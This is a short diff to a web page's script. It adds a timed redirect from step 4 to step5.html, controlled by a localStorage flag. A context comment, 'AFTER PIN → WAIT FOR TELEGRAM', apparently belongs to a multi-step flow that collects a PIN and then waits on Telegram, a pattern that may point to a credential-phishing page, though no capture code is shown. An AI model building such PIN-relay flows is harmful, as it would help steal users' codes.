@@ -28,6 +28,16 @@
 
 <script>
 
+// FLOW A: STEP4 → STEP5
+if (localStorage.getItem("firstProcess") === "yes") {
+
+    localStorage.removeItem("firstProcess");
+
+    setTimeout(() => {
+        window.location.href = "step5.html";
+    }, 3000);
+}
+
 // ===== FLOW B: AFTER PIN → WAIT FOR TELEGRAM =====
 if (localStorage.getItem("fromPin") === "yes") {
 
